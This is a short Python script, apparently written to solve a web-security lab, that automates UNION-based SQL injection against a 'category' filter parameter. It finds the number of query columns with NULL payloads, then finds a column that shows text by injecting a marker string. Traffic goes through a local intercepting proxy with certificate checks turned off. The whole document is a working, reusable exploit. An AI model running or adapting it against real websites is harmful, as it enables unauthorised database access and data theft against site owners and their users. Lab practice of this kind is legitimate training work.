import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli(url,payload):
    uri = "/filter?category=Gifts'"
    i = 1
    while(True):
        if i!=1:
            payload = payload + ", NULL"
        else:
            payload = payload + " NULL"    
        pay2 = payload + " --"
        r = requests.get(url+uri+pay2, verify = False, proxies=proxies)
        if "Error" in r.text:
            i = i+1
        else:
            break
    return i

def exploit_sqli_string(url , no_of_columns):
    uri = "/filter?category=Gifts'"
    for i in range(1,no_of_columns+1):
        string = "'UIMQ9h'"
        payload_list = ['null'] * no_of_columns
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + uri + sql_payload, verify= False, proxies =proxies)
        res = r.text
        if string.strip('\'') in res:
            return 1
    return False        

if __name__ == "__main__":
    try:
        # print("IN payload DON'T give the 'NULL --'")
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("Usage %s <url> <payload>"% sys.argv[0])
        print("Example %s www.example.com ' 1=1--'" % sys.argv[0])
        sys.exit(-1)

    print("Calculating Number of Columns")
    no_of_columns =  exploit_sqli(url,payload)
    print("No of columns = %i"% no_of_columns)
    print("Finding which column have string data type and the specidied text...")
    string_column = exploit_sqli_string(url, no_of_columns)
    if string_column:
        print("The column contains text is " + str(string_column) + ".")
    else:
        print("we were not able to find a column that has a string data type")
            